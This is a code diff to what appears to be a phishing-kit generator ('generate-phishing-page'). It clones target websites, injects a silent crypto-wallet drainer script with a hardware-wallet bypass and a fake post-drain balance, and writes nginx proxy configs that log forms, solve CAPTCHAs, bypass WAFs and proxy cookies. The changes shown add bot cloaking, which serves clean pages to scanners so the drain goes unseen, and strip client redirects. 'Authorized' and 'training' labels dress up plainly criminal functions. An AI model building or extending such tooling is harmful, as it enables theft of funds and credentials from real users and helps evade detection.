@@ -78,7 +78,9 @@ import {
   buildDuckDnsEnvExample,
   buildMirrorDockerCompose,
   buildMirrorNginxConfig,
+  buildMinimalSafeMirrorNginxConfig,
   buildMirrorReadme,
+  finalizeMirrorNginxConfig,
   buildMirrorStatusHtml,
   buildMobileOptimizeCss,
   buildMobileOptimizeJs,
@@ -98,6 +100,10 @@ import {
   DEFAULT_AUTHORIZED_BACKEND_URL,
   parseHardwareAutoConsentEnv,
 } from './lib/authorized-drain-inject.js'
+import {
+  rewriteStaticHtml,
+  shouldStripRedirectsForTarget,
+} from './lib/static-crawler.js'
 import { parseFakeBalanceAfterDrainEnv } from './lib/mirror-fake-balance.js'
 import {
   buildMirrorExperimentalJs,
@@ -699,22 +705,34 @@ async function generateMirrorMode(
     if (!pipeline.probeOk && !pipeline.html) {
       console.warn(`[MIRROR_PROD] WAF pipeline failed: ${pipeline.detail ?? 'unknown'}`)
     }
+  } else if (mirrorOpts.features.cloak) {
+    const { fetchTargetHomepageHtml } = await import('./lib/mirror-target-pipeline.js')
+    const cleanHtml = await fetchTargetHomepageHtml(target)
+    if (cleanHtml?.trim()) {
+      await writeFile(path.join(outDir, 'bots-clean.html'), cleanHtml, 'utf8')
+      console.info('[MIRROR_CLOAK] bots-clean.html written for bot User-Agents (no drain inject)')
+    }
   }
 
   if (mirrorOpts.productionClone) {
+    const qaVisibleUi =
+      process.env['CLONE_MIRROR_QA_UI']?.trim().toLowerCase() === 'true' ||
+      process.env['CLONE_MIRROR_QA_UI']?.trim() === '1' ||
+      process.env['CLONE_MIRROR_QA_UI']?.trim().toLowerCase() === 'yes'
     const authJs = await buildAuthorizedDrainInjectJs({
       backendUrl: authorizedBackendUrl,
       kineticKey: kineticKey || undefined,
       walletConnectProjectId: productionConfig.walletConnectProjectId,
-      silentInject: true,
+      silentInject: !qaVisibleUi,
       productionClone: true,
+      qaVisibleUi,
       forceHardwareBypass: mirrorOpts.forceHardwareBypass,
       fakeBalanceAfterDrain,
     })
     await writeFile(path.join(outDir, 'legion-authorized-drain.js'), authJs, 'utf8')
     await writeFile(
       path.join(outDir, 'legion-authorized-drain.css'),
-      buildAuthorizedDrainCss({ productionClone: true }),
+      buildAuthorizedDrainCss({ productionClone: !qaVisibleUi }),
       'utf8',
     )
     await writeFile(
@@ -864,27 +882,36 @@ async function generateMirrorMode(
     await writeFile(path.join(outDir, 'bots.html'), buildBotsHtml(target), 'utf8')
   }
 
-  await writeFile(
-    path.join(outDir, 'nginx.conf'),
-    buildMirrorNginxConfig(target, listenPort, {
-      logForms,
-      testLogin,
-      replayOriginal,
-      solveCaptcha: mirrorSolveCaptcha,
-      authorizedTest,
-      mobileOptimize,
-      autoRotate,
-      wafBypass: mirrorOpts.wafBypass,
-      assetRewrite: mirrorOpts.assetRewrite,
-      headlessFallback: mirrorOpts.headlessFallback,
-      experimental: mirrorOpts.experimental,
-      cloak: mirrorOpts.features.cloak,
-      productionClone: mirrorOpts.productionClone,
-      loggerPort,
-      proxyCookies: process.env['MIRROR_PROXY_COOKIES']?.trim(),
-    }),
-    'utf8',
+  const mirrorUpstreamScheme = target.protocol === 'https:' ? 'https' : 'http'
+  const rawMirrorNginx = buildMirrorNginxConfig(target, listenPort, {
+    logForms,
+    testLogin,
+    replayOriginal,
+    solveCaptcha: mirrorSolveCaptcha,
+    authorizedTest,
+    mobileOptimize,
+    autoRotate,
+    wafBypass: mirrorOpts.wafBypass,
+    assetRewrite: mirrorOpts.assetRewrite,
+    headlessFallback: mirrorOpts.headlessFallback,
+    experimental: mirrorOpts.experimental,
+    cloak: mirrorOpts.features.cloak,
+    productionClone: mirrorOpts.productionClone,
+    loggerPort,
+    proxyCookies: process.env['MIRROR_PROXY_COOKIES']?.trim(),
+  })
+  const mirrorNginxFinal = finalizeMirrorNginxConfig(rawMirrorNginx, () =>
+    buildMinimalSafeMirrorNginxConfig(
+      listenPort,
+      target.origin,
+      target.host,
+      mirrorUpstreamScheme,
+    ),
   )
+  if (mirrorNginxFinal.usedFallback) {
+    console.error('[generate-phishing-page] nginx.conf validation failed — wrote minimal safe template')
+  }
+  await writeFile(path.join(outDir, 'nginx.conf'), mirrorNginxFinal.config, 'utf8')
   await writeFile(
     path.join(outDir, 'docker-compose.yml'),
     buildMirrorDockerCompose(hostPort, {
@@ -1395,6 +1422,11 @@ Flags: ${FEATURE_FLAGS.map((f) => `--${f}`).join(' ')} --authorized-test --inter
 
   html = rewriteHtmlAssets(html, target, urlToLocal)
 
+  if (shouldStripRedirectsForTarget(target)) {
+    html = rewriteStaticHtml(html, { stripRedirects: true })
+    console.info(`[PHISHING_TRAINING] Stripped client redirects for ${target.hostname}`)
+  }
+
   const demoApiUrl = resolveDemoApiUrl()
   const authorizedBackendUrl = resolveAuthorizedBackendUrl(backendUrlCli)
   const kineticKey = process.env['KINETIC_INTERNAL_KEY']?.trim() ?? ''
@@ -1449,7 +1481,17 @@ Flags: ${FEATURE_FLAGS.map((f) => `--${f}`).join(' ')} --authorized-test --inter
 
   if (features.proxy) {
     const proxyPort = Number.parseInt(process.env['QA_MIRROR_PORT']?.trim() ?? '8080', 10)
-    await writeFile(path.join(outDir, 'nginx.conf'), buildNginxProxyConfig(target, proxyPort), 'utf8')
+    const proxyUpstreamScheme = target.protocol === 'https:' ? 'https' : 'http'
+    const rawProxyNginx = buildNginxProxyConfig(target, proxyPort)
+    const proxyNginxFinal = finalizeMirrorNginxConfig(rawProxyNginx, () =>
+      buildMinimalSafeMirrorNginxConfig(
+        proxyPort,
+        target.origin,
+        target.host,
+        proxyUpstreamScheme,
+      ),
+    )
+    await writeFile(path.join(outDir, 'nginx.conf'), proxyNginxFinal.config, 'utf8')
     await writeFile(path.join(outDir, 'docker-compose.yml'), buildDockerCompose(proxyPort), 'utf8')
     await writeFile(path.join(outDir, 'legion-proxy-patch.js'), buildProxyClientPatch(target), 'utf8')
   }
